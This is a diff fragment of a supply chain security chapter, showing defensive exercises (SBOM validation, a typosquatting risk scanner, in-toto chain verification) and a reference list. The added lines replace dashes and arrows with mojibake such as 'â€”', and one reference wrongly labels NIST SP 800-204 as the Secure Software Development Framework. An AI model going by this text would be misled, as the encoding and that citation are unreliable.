 3. Run the `CycloneDXValidator` on the generated SBOM and fix any validation errors.
-4. Add license URL resolution — for each component, fetch the license URL from the npm registry.
+4. Add license URL resolution â€” for each component, fetch the license URL from the npm registry.
 
 **Deliverable:** Generated SBOM JSON file + validation report.
 
@@ -3074,7 +3074,7 @@ This chapter covered the critical topic of software supply chain and CI/CD pipel
    - Package download count and trend
    - Last publish date (abandoned packages > 2 years)
    - Presence of known typosquatting targets
-2. Implement a risk scoring algorithm (0–100) based on these factors.
+2. Implement a risk scoring algorithm (0â€“100) based on these factors.
 3. Test against 10 popular packages and 10 suspicious packages.
 
 **Deliverable:** Scanner implementation with risk scores and a report comparing legitimate vs. suspicious packages.
@@ -3088,7 +3088,7 @@ This chapter covered the critical topic of software supply chain and CI/CD pipel
 **Tasks:**
 1. Create an `InTotoVerifier` class that:
    - Parses multiple in-toto attestation links
-   - Verifies the chain of custody (developer → build → test → deploy)
+   - Verifies the chain of custody (developer â†’ build â†’ test â†’ deploy)
    - Validates signatures at each link
    - Reports any gaps or inconsistencies in the chain
 2. Simulate a complete attestation chain with 4 steps.
@@ -3102,18 +3102,18 @@ This chapter covered the critical topic of software supply chain and CI/CD pipel
 
 ## References
 
-1. **SolarWinds SUNBURST Attack Technical Analysis** — FireEye/Mandiant Report (2020)
-2. **Codecov Breach Analysis** — Trail of Bits (2021)
-3. **CVE-2021-44228 (Log4Shell)** — Apache Foundation Advisory
-4. **SLSA Framework** — slsa.dev
-5. **Sigstore/Cosign Documentation** — sigstore.dev
-6. **CycloneDX SBOM Standard** — cyclonedx.org (OWASP)
-7. **SPDX SBOM Standard** — spdx.dev (Linux Foundation)
-8. **TUF (The Update Framework)** — theupdateframework.io
-9. **in-toto Attestations** — in-toto.io
-10. **OWASP Dependency Check** — owasp.org/www-project-dependency-check/
-11. **GitHub Actions Security Hardening** — docs.github.com/en/actions/security-guides
-12. **NIST SP 800-204: Secure Software Development Framework** — NIST
-13. **Google's SLSA Provenance Generator** — github.com/slsa-framework/slsa-github-generator
-14. **Sigstore Fulcio** — sigstore.dev/fulcio (OIDC-based certificate authority)
-15. **Docker Content Trust / Notary** — docs.docker.com/engine/security/trust/
+1. **SolarWinds SUNBURST Attack Technical Analysis** â€” FireEye/Mandiant Report (2020)
+2. **Codecov Breach Analysis** â€” Trail of Bits (2021)
+3. **CVE-2021-44228 (Log4Shell)** â€” Apache Foundation Advisory
+4. **SLSA Framework** â€” slsa.dev
+5. **Sigstore/Cosign Documentation** â€” sigstore.dev
+6. **CycloneDX SBOM Standard** â€” cyclonedx.org (OWASP)
+7. **SPDX SBOM Standard** â€” spdx.dev (Linux Foundation)
+8. **TUF (The Update Framework)** â€” theupdateframework.io
+9. **in-toto Attestations** â€” in-toto.io
+10. **OWASP Dependency Check** â€” owasp.org/www-project-dependency-check/
+11. **GitHub Actions Security Hardening** â€” docs.github.com/en/actions/security-guides
+12. **NIST SP 800-204: Secure Software Development Framework** â€” NIST
+13. **Google's SLSA Provenance Generator** â€” github.com/slsa-framework/slsa-github-generator
+14. **Sigstore Fulcio** â€” sigstore.dev/fulcio (OIDC-based certificate authority)
+15. **Docker Content Trust / Notary** â€” docs.docker.com/engine/security/trust/
